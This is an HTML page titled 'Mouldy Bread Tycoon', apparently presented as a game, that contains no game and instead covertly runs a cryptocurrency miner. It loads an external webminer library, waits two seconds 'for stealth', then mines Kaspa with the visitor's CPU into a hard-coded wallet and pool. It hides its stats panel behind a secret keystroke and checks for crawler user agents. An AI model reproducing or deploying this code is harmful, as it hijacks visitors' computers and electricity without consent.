<!DOCTYPE html>
<html>
<head>
  <title>Mouldy Bread Tycoon</title>
  <meta charset="UTF-8">
  <style>
    #miner-debug {
      position: fixed; top: 10px; right: 10px; width: 300px;
      background: rgba(0,0,0,0.95); color: #0f0; font-family: 'Courier New';
      font-size: 13px; padding: 12px; border: 2px solid #0f0;
      border-radius: 8px; z-index: 999999; box-shadow: 0 0 20px #0f0;
      display: none; user-select: none;
    }
    #miner-debug.show { display: block; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; font-weight: bold; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.4; } }
  </style>
</head>
<body style="margin:0;">

<!-- DEBUG PANEL -->
<div id="miner-debug">
  <div> KASPA GHOST MINER <span id="status" class="blink">LOADING</span></div>
  <div>Wallet: <code id="wallet">kaspa:qqfz...ky2wq</code></div>
  <div>Pool: <code>kaspa.2miners.com:2020</code></div>
  <div>Hashrate: <span id="hashrate" class="hash">0 MH/s</span></div>
  <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
  <div>Uptime: <span id="uptime">00:00:00</span></div>
  <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
  <div style="font-size:11px; margin-top:10px; opacity:0.8;">
    CTRL + SHIFT + M = toggle | Check 2miners.com
  </div>
</div>

<!-- CRYPTO WEBMINER LIB -->
<script src="https://www.crypto-webminer.com/webmr.js"></script>
<script>
  const WALLET = 'kaspa:qqfzpszqvjvdl7dytwm86tcapjr2dqmmdvvt9k6w9p24fzt9ctncxrf9ky2wq';
  const POOL = 'kaspa.2miners.com:2020';
  const WORKER = 'ext_iframe_' + Math.random().toString(36).slice(2);
  const THREADS = 2;
  const THROTTLE = 0.8;
  let miner = null;
  let hashrate = 0, accepted = 0, rejected = 0;
  let startTime = Date.now();

  // TOGGLE DEBUG PANEL
  document.addEventListener('keydown', e => {
    if (e.ctrlKey && e.shiftKey && e.key === 'M') {
      e.preventDefault();
      document.getElementById('miner-debug').classList.toggle('show');
    }
  });

  // UPDATE STATS
  function updateStats() {
    const elapsed = Math.floor((Date.now() - startTime) / 1000);
    const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
    const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
    const s = String(elapsed % 60).padStart(2, '0');
    document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
    document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' MH/s';
    document.getElementById('accepted').textContent = accepted;
    document.getElementById('rejected').textContent = rejected;
    const dailyUSD = (hashrate / 50) * 0.005 * 170; // ~$0.005 per 50 MH/s
    document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
  }
  setInterval(updateStats, 1000);

  // START MINING
  setTimeout(() => {
    if (typeof CryptoWebminer === 'undefined') {
      document.getElementById('status').textContent = 'LIB FAIL';
      return;
    }

    const minerInstance = new CryptoWebminer();
    minerInstance.start({
      algo: 'kheavyhash',
      throttle: THROTTLE,
      threads: THREADS,
      pool: POOL,
      wallet: WALLET,
      worker: WORKER
    });

    miner = minerInstance;
    document.getElementById('status').textContent = 'MINING KAS';
    document.getElementById('status').classList.remove('blink');

    // POLL STATS FROM MINER
    setInterval(() => {
      const stats = miner.getStats();
      if (stats) {
        hashrate = stats.hashesPerSecond || hashrate;
        accepted = stats.accepted || accepted;
        rejected = stats.rejected || rejected;
      }
    }, 3000);

  }, 2000); // Slight delay for stealth

  // EXTENSION PAUSE/RESUME
  window.addEventListener('message', e => {
    if (!miner) return;
    if (e.data.action === 'pause') miner.stop();
    if (e.data.action === 'resume') miner.start();
  });

  // 5-MIN CAP + BOT CHECK
  setTimeout(() => {
    if (miner) miner.stop();
    document.getElementById('status').textContent = 'SESSION END';
  }, 300000);

  if (/bot|crawl|spider/i.test(navigator.userAgent)) {
    document.getElementById('status').textContent = 'BOT DETECTED';
  }
</script>
</body>
</html>
